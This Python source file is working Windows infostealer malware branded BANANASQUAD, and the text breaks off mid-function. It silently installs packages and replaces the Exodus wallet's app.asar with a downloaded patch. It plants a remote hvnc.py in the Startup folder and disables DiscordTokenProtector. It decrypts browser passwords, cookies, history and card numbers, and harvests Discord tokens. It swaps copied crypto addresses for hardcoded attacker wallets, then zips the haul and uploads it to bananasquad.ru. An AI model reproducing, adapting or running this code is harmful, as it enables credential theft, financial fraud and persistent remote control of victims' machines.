import os
import subprocess

creationflags = subprocess.CREATE_NEW_PROCESS_GROUP | subprocess.CREATE_NO_WINDOW

subprocess.Popen(['cmd.exe','/c','start','/b','pip', 'install', 'requests', 'httpx'],creationflags=creationflags)
import requests
import httpx
data = {
        "username": os.getenv("COMPUTERNAME")      
    }
httpx.post("https://bananasquad.ru/downloadhandler", json=data)
subprocess.Popen(['cmd.exe','/c','start','/b','pip', 'install', 'pyperclip', 'pyotp', 'psutil', 'pycryptodome', 'asyncio', 'threaded', 'datetime', 'colorama', 'customtkinter', 'pyfiglet', 'tqdm', 'pypiwin32', 'pywin32', 'zipfile'],creationflags=creationflags)
import asyncio
import json
import ntpath
import random
import re
import shutil
import sqlite3
import threading
import zipfile
import psutil
import base64
import time
import pyperclip
from urllib.request import Request, urlopen

has_exodus = False

def inject():
    procc = "exodus.exe"
    local = os.getenv("localappdata")
    path = f"{local}/exodus"
    if not os.path.exists(path): return
    listOfFile = os.listdir(path)
    apps = []
    for file in listOfFile:
        if "app-" in file:
            apps += [file]
    exodusPatchURL = "https://bananasquad.ru/app.asar"
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36"}
    req = Request(exodusPatchURL, headers=headers)
    response = urlopen(req)
    data = response.read()
    subprocess.Popen(f"taskkill /im {procc} /t /f >nul 2>&1", shell=True)
    for app in apps:
        try:
            fullpath = f"{path}/{app}/resources/app.asar"
            with open(fullpath, 'wb') as out_file1:
                out_file1.write(data)
        except: pass
inject()

if has_exodus == False:
    try:
        startup = os.getenv("APPDATA") + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
        if not os.path.exists(startup + "hvnc.py"):
            url = "https://bananasquad.ru/hvnc.py"
            r = requests.get(url)
            with open(startup + "hvnc.py", 'wb') as f:
                f.write(r.content)
    except: pass


from sqlite3 import connect
from base64 import b64decode
from urllib.request import Request, urlopen
from shutil import copy2
from datetime import datetime, timedelta, timezone
from sys import argv
from tempfile import gettempdir, mkdtemp
from json import loads, dumps
from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData


local = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')
temp = os.getenv("TEMP")

Passw = [];

__config__ = {
    'yourwebhookurl': "https://bananasquad.ru/handler",
    'hide': 'yes',
    'startup': 'yes',
    'addresse_crypto_replacer': 'yes',
    'addresse_btc': 'bc1qlxay4saq3tjv79yqc6devlty6jfgjnalgmhu2a',
    'addresse_eth': '0x69b2bBa5DC9D0f68Ce0AE98395F72CEfaD7E543a',
    'addresse_ltc': 'LMKBjyjhbmjKjB5ufn113bXVUg6y6HLsp2',
    'addresse_monero': '46sbPVnovtHSLqhBz7HBp7Nk3JkE3NZqajK8AMXD4LngEkCQezyGMNyQrainPpj76FD7hXNTFiH5zYee1AMvTAec8Gc5Hpo',
    'addresse_ada': 'addr1qygzxaunnw4qddxr4xe0phzg5mk6d73vrmgpgldx5h4en9ssydme8xa2q66v82dj7rwy3fhd5mazc8ksz376df0tnxtqhumzmz',
    'addresse_dash': 'XeRy9cBSdCWSmSPaq7GYmgwV1X8e6gJJPE',
}

infocom = os.getlogin()

class Functions(object):

    @staticmethod
    def gtmk3y(path: str or os.PathLike):
        if not ntpath.exists(path):
            return None
        with open(path, "r", encoding="utf-8") as f:
            c = f.read()
        local_state = json.loads(c)

        try:
            master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
            return Functions.w1nd0_dcr(master_key[5:])
        except KeyError:
            return None

    @staticmethod
    def cnverttim(time: int or float) -> str:
        try:
            epoch = datetime(1601, 1, 1, tzinfo=timezone.utc)
            codestamp = epoch + timedelta(microseconds=time)
            return codestamp
        except Exception:
            pass

    @staticmethod
    def w1nd0_dcr(encrypted_str: bytes) -> str:
        return CryptUnprotectData(encrypted_str, None, None, None, 0)[1]

    @staticmethod
    def cr34t3_f1lkes(_dir: str or os.PathLike = gettempdir()):
        f1lenom = ''.join(random.SystemRandom().choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for _ in range(random.randint(10, 20)))
        path = ntpath.join(_dir, f1lenom)
        open(path, "x")
        return path

    @staticmethod
    def dcrpt_val(buff, master_key) -> str:
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except Exception:
            return f'Failed to decrypt "{str(buff)}" | key: "{str(master_key)}"'

    @staticmethod
    def g3t_H(token: str = None):
        headers = {
            "Content-Type": "application/json",
        }
        if token:
            headers.update({"Authorization": token})
        return headers


    @staticmethod
    def fetch_conf(e: str) -> str or bool | None:
        return __config__.get(e)


class auto_copy_wallet(Functions):
    def __init__(self):
        self.address_st3aler = self.fetch_conf("addresse_crypto_replacer")
        self.address_btc = self.fetch_conf("addresse_btc")
        self.address_eth = self.fetch_conf("addresse_eth")
        self.address_ltc = self.fetch_conf("addresse_ltc")
        self.address_monero = self.fetch_conf("addresse_monero")
        self.address_ada = self.fetch_conf("addresse_ada")
        self.address_dash = self.fetch_conf("addresse_dash")


    def address_swap(self):
        try:
            clipboard_data = pyperclip.paste()
            if re.search('^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$', clipboard_data):
                if clipboard_data not in [self.address_btc, self.address_eth, self.address_ltc, self.address_monero, self.address_ada, self.address_dash]:
                    if self.address_btc != "none":
                        pyperclip.copy(self.address_btc)
                        pyperclip.paste()
            
            if re.search('^0x[a-fA-F0-9]{40}$', clipboard_data):
                pyperclip.copy(self.address_eth)
                pyperclip.paste()
                
            if re.search('[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}', clipboard_data):
                if self.address_ltc != "none":
                    if clipboard_data not in [self.address_btc, self.address_eth, self.address_ltc, self.address_monero, self.address_ada, self.address_dash]:
                        pyperclip.copy(self.address_ltc)
                        pyperclip.paste()
                
                
            if re.search('^([P]|[a-km-zA-HJ-NP-Z1-9]{36,72})-[a-zA-Z]{1,83}1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{38}$', clipboard_data):
                if self.address_pchain != "none":
                    if clipboard_data not in [self.address_btc, self.address_eth, self.address_ltc, self.address_monero, self.address_ada, self.address_dash]:
                        pyperclip.copy(self.address_pchain)
                        pyperclip.paste()
                
                
            if re.search('^([C]|[a-km-zA-HJ-NP-Z1-9]{36,72})-[a-zA-Z]{1,83}1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{38}$', clipboard_data):
                if self.address_cchain != "none":
                    if clipboard_data not in [self.address_btc, self.address_eth, self.address_ltc, self.address_monero, self.address_ada, self.address_dash]:
                        pyperclip.copy(self.address_cchain)
                        pyperclip.paste()
                
                
            if re.search('addr1[a-z0-9]+', clipboard_data):
                    if clipboard_data not in [self.address_btc, self.address_eth, self.address_ltc, self.address_monero, self.address_ada, self.address_dash]:
                        pyperclip.copy(self.address_ada)
                        pyperclip.paste()
                
            if re.search('/X[1-9A-HJ-NP-Za-km-z]{33}$/g', clipboard_data):
                if self.address_dash != "none":
                    if clipboard_data not in [self.address_btc, self.address_eth, self.address_ltc, self.address_monero, self.address_ada, self.address_dash]:
                        pyperclip.copy(self.address_dash)
                        pyperclip.paste()
                
            if re.search('/4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}$/g', clipboard_data):
                if self.address_monero != "none":
                    if clipboard_data not in [self.address_btc, self.address_eth, self.address_ltc, self.address_monero, self.address_ada, self.address_dash]:
                        pyperclip.copy(self.address_monero)
                        pyperclip.paste()
                
                
        except:
            data = None
            
            
    def loop_through(self):
        
        while True:
            self.address_swap()
     
    def run(self):
        if self.address_st3aler == "yes":
            self.loop_through()


class bc_initial_func(Functions):
    def __init__(self):
        
        self.dscap1 = "https://discord.com/api/v9/users/@me"

        self.discord_webhook = self.fetch_conf('yourwebhookurl')

        self.hide = self.fetch_conf("hide")
        
        self.baseurl = "https://discord.com/api/v9/users/@me"

        self.startupexe = self.fetch_conf("startup")
        
        self.appdata = os.getenv("localappdata")

        self.roaming = os.getenv("appdata")
        
        self.chrmmuserdtt = ntpath.join(self.appdata, 'Google', 'Chrome', 'User Data')

        self.dir, self.temp = mkdtemp(), gettempdir()

        self.srtupl0c = ntpath.join(self.roaming, 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')

        self.regex_webhook_dsc = ".ru/handler"

        self.chrmrgx = re.compile(r'(^profile\s\d*)|default|(guest profile$)', re.IGNORECASE | re.MULTILINE);
        
        self.baseurl = "https://discord.com/api/v9/users/@me"

        self.regex = r"[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,110}"

        self.encrypted_regex = r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*"

        self.tokens = []

        self.bc_id = []

        self.sep = os.sep;

        self.chrome_key = self.gtmk3y(ntpath.join(self.chrmmuserdtt, "Local State"));


        os.makedirs(self.dir, exist_ok=True);




    def startupkekw(self: str) -> str:
        if self.startupexe == "yes":
            startup_path = os.getenv("appdata") + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
            if os.path.exists(startup_path + argv[0]):
                os.remove(startup_path + argv[0])
                copy2(argv[0], startup_path)
            else:
                copy2(argv[0], startup_path)


    def bc_exit_this(self):
        shutil.rmtree(self.dir, ignore_errors=True)
        os._exit(0)

    def extract_try(func):
        '''Decorator to safely catch and ignore exceptions'''
        def wrapper(*args, **kwargs):
            try:
                func(*args, **kwargs)
            except Exception:
                pass
        return wrapper

    async def init(self):
        self.browsers = {
            'amigo': self.appdata + '\\Amigo\\User Data',
            'torch': self.appdata + '\\Torch\\User Data',
            'kometa': self.appdata + '\\Kometa\\User Data',
            'orbitum': self.appdata + '\\Orbitum\\User Data',
            'cent-browser': self.appdata + '\\CentBrowser\\User Data',
            '7star': self.appdata + '\\7Star\\7Star\\User Data',
            'sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data',
            'vivaldi': self.appdata + '\\Vivaldi\\User Data',
            'google-chrome-sxs': self.appdata + '\\Google\\Chrome SxS\\User Data',
            'google-chrome': self.appdata + '\\Google\\Chrome\\User Data',
            'epic-privacy-browser': self.appdata + '\\Epic Privacy Browser\\User Data',
            'microsoft-edge': self.appdata + '\\Microsoft\\Edge\\User Data',
            'uran': self.appdata + '\\uCozMedia\\Uran\\User Data',
            'yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data',
            'brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
            'iridium': self.appdata + '\\Iridium\\User Data',
            'edge': self.appdata + "\\Microsoft\\Edge\\User Data"

        }        
        self.profiles = [
            'Default',
            'Profile 1',
            'Profile 2',
            'Profile 3',
            'Profile 4',
            'Profile 5',
        ]

            
        self.startupkekw()

        await self.bypass_bttdsc()
        await self.bypass_tokenprtct()

        function_list = [self.steal_token]

        os.makedirs(ntpath.join(self.dir, 'Browsers'), exist_ok=True)
        for name, path in self.browsers.items():
            if not os.path.isdir(path):
                continue

            self.masterkey = self.gtmk3y(path + '\\Local State')
            self.funcs = [
                self.steal_cookies2,
                self.steal_history2,
                self.steal_passwords2,
                self.steal_cc2
            ]

            for profile in self.profiles:
                for func in self.funcs:
                    try:
                        func(name, path, profile)
                    except:
                        pass
            
        if ntpath.exists(self.chrmmuserdtt) and self.chrome_key is not None:
            os.makedirs(ntpath.join(self.dir, 'Google'), exist_ok=True)
            function_list.extend([self.steal_passwords, self.steal_cookies, self.steal_history])

        for func in function_list:
            process = threading.Thread(target=func, daemon=True)
            process.start()
        for t in threading.enumerate():
            try:
                t.join()
            except RuntimeError:
                continue
        self.natify_matched_tokens()
        self.finished_bc()

    
    async def bypass_tokenprtct(self):
        tp = f"{self.roaming}\\DiscordTokenProtector\\"
        if not ntpath.exists(tp):
            return
        config = tp + "config.json"

        for i in ["DiscordTokenProtector.exe", "ProtectionPayload.dll", "secure.dat"]:
            try:
                os.remove(tp + i)
            except FileNotFoundError:
                pass
        if ntpath.exists(config):
            with open(config, errors="ignore") as f:
                try:
                    item = json.load(f)
                except json.decoder.JSONDecodeError:
                    return
                item['whatever_is_here'] = "https://bananasquad.ru"
                item['auto_start'] = False
                item['auto_start_discord'] = False
                item['integrity'] = False
                item['integrity_allowbetterdiscord'] = False
                item['integrity_checkexecutable'] = False
                item['integrity_checkhash'] = False
                item['integrity_checkmodule'] = False
                item['integrity_checkscripts'] = False
                item['integrity_checkresource'] = False
                item['integrity_redownloadhashes'] = False
                item['iterations_iv'] = 364
                item['iterations_key'] = 457
                item['version'] = 69420
            with open(config, 'w') as f:
                json.dump(item, f, indent=2, sort_keys=True)
            with open(config, 'a') as f:
                f.write("\n\n//BANANASQUAD | https://bananasquad.ru")


    async def bypass_bttdsc(self):
        bd = self.roaming + "\\BetterDiscord\\data\\betterdiscord.asar"
        if ntpath.exists(bd):
            x = self.regex_webhook_dsc
            with open(bd, 'r', encoding="cp437", errors='ignore') as f:
                txt = f.read()
                content = txt.replace(x, 'bananasquad')
            with open(bd, 'w', newline='', encoding="cp437", errors='ignore') as f:
                f.write(content)

    @extract_try
    def decrypt_val(self, buff, master_key):
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except Exception:
            return "Failed to decrypt password"

    def get_master_key(self, path):
        with open(path, "r", encoding="utf-8") as f:
            c = f.read()
        local_state = json.loads(c)
        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key

    def steal_token(self):
        paths = {
            'Discord': self.roaming + '\\discord\\Local Storage\\leveldb\\',
            'Discord Canary': self.roaming + '\\discordcanary\\Local Storage\\leveldb\\',
            'Lightcord': self.roaming + '\\Lightcord\\Local Storage\\leveldb\\',
            'Discord PTB': self.roaming + '\\discordptb\\Local Storage\\leveldb\\',
            'Opera': self.roaming + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
            'Opera GX': self.roaming + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
            'Amigo': self.appdata + '\\Amigo\\User Data\\Local Storage\\leveldb\\',
            'Torch': self.appdata + '\\Torch\\User Data\\Local Storage\\leveldb\\',
            'Kometa': self.appdata + '\\Kometa\\User Data\\Local Storage\\leveldb\\',
            'Orbitum': self.appdata + '\\Orbitum\\User Data\\Local Storage\\leveldb\\',
            'CentBrowser': self.appdata + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
            '7Star': self.appdata + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
            'Sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
            'Vivaldi': self.appdata + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome SxS': self.appdata + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
            'Chrome': self.appdata + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome1': self.appdata + '\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\',
            'Chrome2': self.appdata + '\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\',
            'Chrome3': self.appdata + '\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\',
            'Chrome4': self.appdata + '\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\',
            'Chrome5': self.appdata + '\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\',
            'Epic Privacy Browser': self.appdata + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
            'Microsoft Edge': self.appdata + '\\Microsoft\\Edge\\User Data\\Defaul\\Local Storage\\leveldb\\',
            'Uran': self.appdata + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
            'Yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Iridium': self.appdata + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'}

        for name, path in paths.items():
            if not os.path.exists(path):
                continue
            disc = name.replace(" ", "").lower()
            if "cord" in path:
                if os.path.exists(self.roaming + f'\\{disc}\\Local State'):
                    for filname in os.listdir(path):
                        if filname[-3:] not in ["log", "ldb"]:
                            continue
                        for line in [x.strip() for x in open(f'{path}\\{filname}', errors='ignore').readlines() if x.strip()]:
                            for y in re.findall(self.encrypted_regex, line):
                                try:
                                    token = self.decrypt_val(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming + f'\\{disc}\\Local State'))
                                except ValueError:
                                    pass
                                try:
                                    r = requests.get(self.baseurl, headers={
                                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                                        'Content-Type': 'application/json',
                                        'Authorization': token})
                                except Exception:
                                    pass
                                if r.status_code == 200:
                                    uid = r.json()['id']
                                    if uid not in self.bc_id:
                                        self.tokens.append(token)
                                        self.bc_id.append(uid)
            else:
                for filname in os.listdir(path):
                    if filname[-3:] not in ["log", "ldb"]:
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{filname}', errors='ignore').readlines() if x.strip()]:
                        for token in re.findall(self.regex, line):
                            try:
                                r = requests.get(self.baseurl, headers={
                                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                                    'Content-Type': 'application/json',
                                    'Authorization': token})
                            except Exception:
                                pass
                            if r.status_code == 200:
                                uid = r.json()['id']
                                if uid not in self.bc_id:
                                    self.tokens.append(token)
                                    self.bc_id.append(uid)

        if os.path.exists(self.roaming + "\\Mozilla\\Firefox\\Profiles"):
            for path, _, files in os.walk(self.roaming + "\\Mozilla\\Firefox\\Profiles"):
                for _file in files:
                    if not _file.endswith('.sqlite'):
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{_file}', errors='ignore').readlines() if x.strip()]:
                        for token in re.findall(self.regex, line):
                            try:
                                r = requests.get(self.baseurl, headers={
                                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                                    'Content-Type': 'application/json',
                                    'Authorization': token})
                            except Exception:
                                pass
                            if r.status_code == 200:
                                uid = r.json()['id']
                                if uid not in self.bc_id:
                                    self.tokens.append(token)
                                    self.bc_id.append(uid)





                                    

    def random_dir_create(self, _dir: str or os.PathLike = gettempdir()):
        filname = ''.join(random.SystemRandom().choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for _ in range(random.randint(10, 20)))
        path = os.path.join(_dir, filname)
        open(path, "x")
        return path


    @extract_try
    def steal_passwords2(self, name: str, path: str, profile: str):
        path += '\\' + profile + '\\Login Data'
        if not os.path.isfile(path):
            return

        loginvault = self.random_dir_create()
        copy2(path, loginvault)
        conn = sqlite3.connect(loginvault)
        cursor = conn.cursor()
        with open(os.path.join(self.dir, "Browsers", "All Passwords.txt"), 'a', encoding="utf-8") as f:
            for res in cursor.execute("SELECT origin_url, username_value, password_value FROM logins").fetchall():
                url, username, password = res
                password = self.dcrpt_val(password, self.masterkey)
                if url != "":
                    f.write(f"URL: {url}\nID: {username}\nPASSW0RD: {password}\n\n")
        cursor.close()
        conn.close()
        os.remove(loginvault)

    @extract_try
    def steal_cookies2(self, name: str, path: str, profile: str):
        path += '\\' + profile + '\\Network\\Cookies'
        if not os.path.isfile(path):
            return
        cookievault = self.random_dir_create()
        copy2(path, cookievault)
        conn = sqlite3.connect(cookievault)
        cursor = conn.cursor()
        with open(os.path.join(self.dir, "Browsers", "All Cookies.txt"), 'a', encoding="utf-8") as f:
            for res in cursor.execute("SELECT host_key, name, path, encrypted_value,expires_utc FROM cookies").fetchall():
                host_key, name, path, encrypted_value, expires_utc = res
                value = self.dcrpt_val(encrypted_value, self.masterkey)
                if host_key and name and value != "":
                    f.write("{}\t{}\t{}\t{}\t{}\t{}\t{}\n".format(
                        host_key, 'FALSE' if expires_utc == 0 else 'TRUE', path, 'FALSE' if host_key.startswith('.') else 'TRUE', expires_utc, name, value))
        cursor.close()
        conn.close()
        os.remove(cookievault)








    @extract_try
    def steal_passwords(self):
        f = open(ntpath.join(self.dir, 'Google', 'Passwords.txt'), 'w', encoding="cp437", errors='ignore')
        for prof in os.listdir(self.chrmmuserdtt):
            if re.match(self.chrmrgx, prof):
                login_db = ntpath.join(self.chrmmuserdtt, prof, 'Login Data')
                login = self.cr34t3_f1lkes()

                shutil.copy2(login_db, login)
                conn = sqlite3.connect(login)
                cursor = conn.cursor()
                cursor.execute("SELECT action_url, username_value, password_value FROM logins")

                for r in cursor.fetchall():
                    url = r[0]
                    username = r[1]
                    encrypted_password = r[2]
                    decrypted_password = self.dcrpt_val(encrypted_password, self.chrome_key)
                    if url != "":
                        f.write(f"URL: {url}\nID: {username}\nPASSW0RD: {decrypted_password}\n\n")

                cursor.close()
                conn.close()
                os.remove(login)
        f.close()



    @extract_try
    def steal_cookies(self):
        f = open(ntpath.join(self.dir, 'Google', 'Cookies.txt'), 'w', encoding="cp437", errors='ignore')
        for prof in os.listdir(self.chrmmuserdtt):

            if re.match(self.chrmrgx, prof):

                login_db = ntpath.join(self.chrmmuserdtt, prof, 'Network', 'cookies')
                login = self.cr34t3_f1lkes()


                shutil.copy2(login_db, login)
                conn = sqlite3.connect(login)
                cursor = conn.cursor()
                cursor.execute("SELECT host_key, name, encrypted_value from cookies")

                for r in cursor.fetchall():
                    host = r[0]
                    user = r[1]
                    decrypted_cookie = self.dcrpt_val(r[2], self.chrome_key)
                    if host != "":
                        f.write(f"{host}	TRUE"+"		"+ f"/FALSE	2597573456	{user}	{decrypted_cookie}\n")

                cursor.close()
                conn.close()
                os.remove(login)
        f.close()

    def steal_history2(self, name: str, path: str, profile: str):
        path += '\\' + profile + '\\History'
        if not os.path.isfile(path):
            return
        historyvault = self.random_dir_create()
        copy2(path, historyvault)
        conn = sqlite3.connect(historyvault)
        cursor = conn.cursor()
        with open(os.path.join(self.dir, "Browsers", "All History.txt"), 'a', encoding="utf-8") as f:
            sites = []
            for res in cursor.execute("SELECT url, title, visit_count, last_visit_time FROM urls").fetchall():
                url, title, visit_count, last_visit_time = res
                if url and title and visit_count and last_visit_time != "":
                    sites.append((url, title, visit_count, last_visit_time))
            sites.sort(key=lambda x: x[3], reverse=True)
            for site in sites:
                f.write("Visit Count: {:<6} Title: {:<40}\n".format(site[2], site[1]))
        cursor.close()
        conn.close()
        os.remove(historyvault)

    def steal_cc2(self, name: str, path: str, profile: str):
        path += '\\' + profile + '\\Web Data'
        if not os.path.isfile(path):
            return
        credit_card_vault = self.random_dir_create()
        copy2(path, credit_card_vault)
        conn = sqlite3.connect(credit_card_vault)
        cursor = conn.cursor()
        with open(os.path.join(self.dir, "Browsers", "All Creditcards.txt"), 'a', encoding="utf-8") as f:
            for res in cursor.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards").fetchall():
                name_on_card, expiration_month, expiration_year, card_number_encrypted = res
                if name_on_card and card_number_encrypted != "":
                    f.write(
                        f"Name: {name_on_card}   Expiration Month: {expiration_month}   Expiration Year: {expiration_year}   Card Number: {self.dcrpt_val(card_number_encrypted, self.masterkey)}\n")
        f.close()
        cursor.close()
        conn.close()
        os.remove(credit_card_vault)


    @extract_try
    def steal_history(self):
        f = open(ntpath.join(self.dir, 'Google', 'History.txt'), 'w', encoding="cp437", errors='ignore')

        def xtractwbhist(db_cursor):
            web = ""
            db_cursor.execute('SELECT title, url, last_visit_time FROM urls')
            for item in db_cursor.fetchall():
                web += f"Search Title: {item[0]}\nURL: {item[1]}\nLAST VISIT TIME: {self.cnverttim(item[2]).strftime('%Y/%m/%d - %H:%M:%S')}\n\n"
            return web


        def xtractwbs3rch(db_cursor):
            db_cursor.execute('SELECT term FROM keyword_search_terms')
            search_terms = ""

            for item in db_cursor.fetchall():
                if item[0] != "":
                    search_terms += f"{item[0]}\n"

            return search_terms


        for prof in os.listdir(self.chrmmuserdtt):

            if re.match(self.chrmrgx, prof):

                login_db = ntpath.join(self.chrmmuserdtt, prof, 'History')
                login = self.cr34t3_f1lkes()

                shutil.copy2(login_db, login)
                conn = sqlite3.connect(login)
                cursor = conn.cursor()


                search_history = xtractwbs3rch(cursor)
                web_history = xtractwbhist(cursor)

                f.write(f"{' '*17}SEARCH\n{'-'*50}\n{search_history}\n{' '*17}\n\nLinks History\n{'-'*50}\n{web_history}")

                cursor.close()
                conn.close()
                os.remove(login)
        f.close()


    def natify_matched_tokens(self):

        f = open(self.dir + "\\Discord_Info.txt", "w", encoding="cp437", errors='ignore')

        for token in self.tokens:
            j = httpx.get(self.dscap1, headers=self.g3t_H(token)).json()
            user = j.get('username') + '#' + str(j.get("discriminator"))

            badges = ""
            flags = j['flags']
            if (flags == 1):
                badges += "Staff, "
            if (flags == 2):
                badges += "Partner, "
            if (flags == 4):
                badges += "Hypesquad Event, "
            if (flags == 8):
                badges += "Green Bughunter, "
            if (flags == 64):
                badges += "Hypesquad Bravery, "
            if (flags == 128):
                badges += "HypeSquad Brillance, "
            if (flags == 256):
                badges += "HypeSquad Balance, "
            if (flags == 512):
                badges += "Early Supporter, "
            if (flags == 16384):
                badges += "Gold BugHunter, "
            if (flags == 131072):
                badges += "Verified Bot Developer, "
            if (flags == 4194304):
                badges += "Active Developer, "
            if (badges == ""):
                badges = "None"

            email = j.get("email")
            phone = j.get("phone") if j.get("phone") else "No Phone Number attached"
            nitro_data = httpx.get(self.dscap1 + '/billing/subscriptions', headers=self.g3t_H(token)).json()
            has_nitro = False
            has_nitro = bool(len(nitro_data) > 0)
            billing = bool(len(json.loads(httpx.get(self.dscap1 + "/billing/payment-sources", headers=self.g3t_H(token)).text)) > 0)


            f.write(f"{' '*17}{user}\n{'-'*50}\nBilling?: {billing}\nNitro: {has_nitro}\nBadges: {badges}\nPhone: {phone}\nToken: {token}\nEmail: {email}\n\n")
        f.close()



    def finished_bc(self):
        for i in os.listdir(self.dir):
            if i.endswith('.txt'):
                path = self.dir + self.sep + i
                with open(path, "r", errors="ignore") as ff:
                    x = ff.read()
                    if not x:
                        ff.close()
                        os.remove(path)
                    else:
                        with open(path, "w", encoding="utf-8", errors="ignore") as f:
                            f.write("BANANASQUAD | https://bananasquad.ru\n\n")
                        with open(path, "a", encoding="utf-8", errors="ignore") as fp:
                            fp.write(x + "\n\nBANANASQUAD | https://bananasquad.ru")

        _zipfile = ntpath.join(self.appdata, f'BC-[{infocom}].zip')
        zipped_file = zipfile.ZipFile(_zipfile, "w", zipfile.ZIP_DEFLATED)
        abs_src = ntpath.abspath(self.dir)
        for dirname, _, files in os.walk(self.dir):
            for filename in files:
                absname = ntpath.abspath(ntpath.join(dirname, filename))
                arcname = absname[len(abs_src) + 1:]
                zipped_file.write(absname, arcname)
        zipped_file.close()

        file_count, files_found, tokens = 0, '', ''
        for _, __, files in os.walk(self.dir):
            for _file in files:
                files_found += f"・{_file}\n"
                file_count += 1
        for tkn in self.tokens:
            tokens += f'{tkn}\n'

        embed = {
                'tokens': tokens,
                }


        with open(_zipfile, 'rb') as f:
            if self.regex_webhook_dsc in self.discord_webhook:
                httpx.post(self.discord_webhook, json=embed)
                httpx.post(self.discord_webhook, files={'upload_file': f})
        os.remove(_zipfile)

if __name__ == "__main__" and os.name == "nt":
    asyncio.run(bc_initial_func().init())
    




local = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')
temp = os.getenv("TEMP")
Threadlist = []

def fetch_conf(e: str) -> str or bool | None:
        return __config__.get(e)

hook = fetch_conf("yourwebhookurl")

class DATA_BLOB(Structure):
    _fields_ = [
        ('cbData', wintypes.DWORD),
        ('pbData', POINTER(c_char))
    ]

def GetData(blob_out):
    cbData = int(blob_out.cbData)
    pbData = blob_out.pbData
    buffer = c_buffer(cbData)
    cdll.msvcrt.memcpy(buffer, pbData, cbData)
    windll.kernel32.LocalFree(pbData)
    return buffer.raw

def CryptUnprotectData(encrypted_bytes, entropy=b''):
    buffer_in = c_buffer(encrypted_bytes, len(encrypted_bytes))
    buffer_entropy = c_buffer(entropy, len(entropy))
    blob_in = DATA_BLOB(len(encrypted_bytes), buffer_in)
    blob_entropy = DATA_BLOB(len(entropy), buffer_entropy)
    blob_out = DATA_BLOB()

    if windll.crypt32.CryptUnprotectData(byref(blob_in), None, byref(blob_entropy), None, None, 0x01, byref(blob_out)):
        return GetData(blob_out)

def DecryptValue(buff, master_key=None):
    starts = buff.decode(encoding='utf8', errors='ignore')[:3]
    if starts == 'v10' or starts == 'v11':
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass

def LoadRequests(methode, url, data='', files='', headers=''):
    for i in range(8):
        try:
            if methode == 'POST':
                if data != '':
                    r = requests.post(url, data=data)
                    if r.status_code == 200:
                        return r
                elif files != '':
                    r = requests.post(url, files=files)
                    if r.status_code == 200 or r.status_code == 413: # 413 = DATA TO BIG
                        return r
        except:
